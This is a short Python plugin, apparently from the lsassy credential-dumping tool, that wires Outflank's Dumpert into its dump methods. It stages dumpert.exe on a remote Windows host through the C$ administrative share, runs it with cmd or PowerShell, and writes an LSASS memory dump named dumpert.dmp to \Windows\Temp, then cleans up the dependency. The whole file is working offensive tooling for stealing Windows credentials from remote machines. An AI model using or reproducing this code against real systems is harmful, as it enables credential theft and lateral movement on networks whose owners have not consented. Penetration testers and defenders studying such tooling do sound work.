"""
https://github.com/outflanknl/Dumpert
"""

from lsassy.dumpmethod import IDumpMethod, Dependency


class DumpMethod(IDumpMethod):
    custom_dump_path_support = False
    custom_dump_name_support = False

    dump_name = "dumpert.dmp"
    dump_share = "C$"
    dump_path = "\\Windows\\Temp\\"

    def __init__(self, session, timeout, time_between_commands):
        super().__init__(session, timeout, time_between_commands)
        self.dumpert = Dependency("dumpert", "dumpert.exe")

    def prepare(self, options):
        return self.prepare_dependencies(options, [self.dumpert])

    def clean(self):
        self.clean_dependencies([self.dumpert])

    def get_commands(self):
        cmd_command = """{}""".format(self.dumpert.get_remote_path())
        return {
            "cmd": cmd_command,
            "pwsh": cmd_command
        }
